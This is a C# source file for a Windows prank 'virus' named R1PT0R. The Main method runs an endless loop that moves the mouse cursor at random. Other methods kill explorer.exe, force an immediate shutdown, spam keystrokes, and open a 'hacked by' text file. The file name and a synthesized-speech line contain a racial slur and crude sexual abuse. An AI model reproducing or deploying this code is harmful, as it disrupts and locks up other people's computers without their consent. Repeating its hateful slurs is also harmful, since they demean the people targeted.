using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Speech.Synthesis;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Drawing.Design;
using System.Drawing.Text;
using System.Drawing;
using System.Windows.Forms;
using System.Threading;

namespace R1PT0R_Virus_2._0._0
{
    class Program
    {
        static void Main(string[] args)
        {
        
            CrazyMouse();
          

        }
        public static void WarnUser()
        {
            //Warns user
            Console.ForegroundColor = ConsoleColor.Red;           
            Console.WriteLine("Hello, This is the R1PT0R Virus.");
            Console.WriteLine("If u don't want to experience the virus Exit out immediately >:)");
          
        }
        public static void Sp00kyTextFile ()
        {
            //Opens Text File
            StreamWriter SpookyTxT = new StreamWriter("Hacked by Nigger LOOOOOOL.txt");
            SpookyTxT.Write("HACKED BY NITRO >:)");
            SpookyTxT.Close();
            Process.Start("Hacked by Nigger LOOOOOOL.txt");
        }
        public static void Robotvoice ()
        {
            //Plays robot voice through speakers
            SpeechSynthesizer RobotVoice = new SpeechSynthesizer();
            RobotVoice.Speak("Hello, Nigger you have just got fucked physically, mentally and sexually by Nitro");
        }

        private static void KillWin10 ()
        {
            //Kills explorer.exe
            foreach (Process p in Process.GetProcesses())
            {
                string name = p.ProcessName.ToLower();
                if (name == "explorer") p.Kill(); 
                
            } 

            
        }
      
        public static  void CrazyMouse ()
        {
            int MoveX = 0;
            int MoveY = 0;

            while(true)
            {
               //Makes mouse cursor move eratically by assigning the mouse to go to random coordinates between 20-10

              MoveX = _random.Next(20) - 10;
              MoveY = _random.Next(20) - 10;
                Cursor.Position = new System.Drawing.Point(Cursor.Position.X +MoveX,  Cursor.Position.Y +MoveY );

                Thread.Sleep(50);

                
            }
          
        }

        private static void DrunkKeyboard()
        {
            //Types random stuff
            while(true)
            {
                SendKeys.SendWait("AAAAAAAAAAAAAAAAAA");
            }

            
        }

        private static void ShutdownPC ()
        {
            //Shutdowns PC
            Process.Start("shutdown", "/s /t 0");
        }

        public static Random _random = new Random(); 

    }
    
}
